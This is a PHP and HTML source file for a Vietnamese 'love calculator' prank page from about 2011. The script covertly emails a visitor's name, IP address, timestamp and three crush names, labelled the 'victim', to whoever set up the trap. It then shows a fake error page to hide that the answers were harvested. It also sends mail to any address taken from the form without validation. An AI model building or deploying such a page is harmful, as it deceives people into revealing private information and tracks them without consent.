<?php
error_reporting(0);
$IP = $_SERVER['REMOTE_ADDR'];
$time= date('F j, Y, g:i a');
$times= date("l jS \of F Y h:i A");
$mailnguoinhan = $_POST['mailsend'];
$tennguoinhan = $_POST['namesend'];
$friend_name = $_POST['friend_name'];
$friend_name2 = $_POST['friend_name2'];
$friend_name3 = $_POST['friend_name3'];
$friend_name4 = $_POST['friend_name4'];
@$from=$_POST['from'];
$noidung = "
<h3>Thong tin phan hoi tu may tinh yeu!</h3>

<pre>
Tên nan nhân : $friend_name
Ip : $IP
Thời gian : $time $times
		Crush:
			1. $friend_name2
			2. $friend_name3
			3. $friend_name4
</pre>
<p>Cám ơn bạn đã sử dụng Site: http://tienvu.tv/love</p>
";

$subject = 'Thu phan hoi tu MAY TINH YEU';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$headers .= 'Calculator Love'.' Develop by: TienVu' . "\r\n";
mail($mailnguoinhan, $subject, $noidung, $headers);
?>
<HTML><HEAD><TITLE>Máy Đo Độ Yêu - TienVu.Tv</TITLE>
<META http-equiv=Content-Type content="text/html; charset=utf-8">
<LINK href="standard.css" type=text/css rel=stylesheet>
<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY>
<span name="from" value="gac@gmail.com"<?php print $from; ?>" size="30" />
<BR><BR>
<TABLE cellSpacing=0 cellPadding=0 width=768 align=center border=0>
  <TBODY>
  <TR>
    <TD class=maintable>
      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR>
          <TD class=logo>TienVu.Tv</TD>
          <TD class=topnavigationtext noWrap align=right>
			</TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD class=maintable align=middle><SPAN class=fooledtagline>Hệ thống đã gặp lỗi do bạn đã nhập sai hoặc không đầy đủ. </SPAN></TD></TR>
  <TR>
    <TD class=maintablenotop vAlign=top align=left>
      <TABLE cellSpacing=0 cellPadding=0 width=566 align=center border=0>
        <TBODY>
        <TR>
          <TD class=fooledcontent align=middle>
            <DIV align=left><BR></DIV></TD></TR>
        <TR class=content>
          <TD>Nhấp vào link bên dưới để nhập lại<BR><BR><a href="index.php">Click !</a> 
        </TD></TR></TBODY></TABLE>
		<br>
                  <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 id="table1">
                    <TBODY>
                    <TR>
                      <TD class=formtable><SPAN id=lblResult>
                      <?php include("qc.txt"); ?>
                      </SPAN></TD></TR></TBODY></TABLE>
                  <br></TD></TR>
  <TR>
    <TD class=maintablelastrow>
      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR>
          <TD class=bottomnavigationtext>© 2011 by <a href="http://tienvu.tv">TienVu.Tv/love</a></TD>
          <TD class=bottomnavigationtext align=right>
		  <a href="http://whos.amung.us/stats/0932200231/" target="_blank">
		  <img src="http://whos.amung.us/swidget/0932200231.png" border="0" /></a>
		  </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FORM>
		  <br />
</BODY>
</HTML>
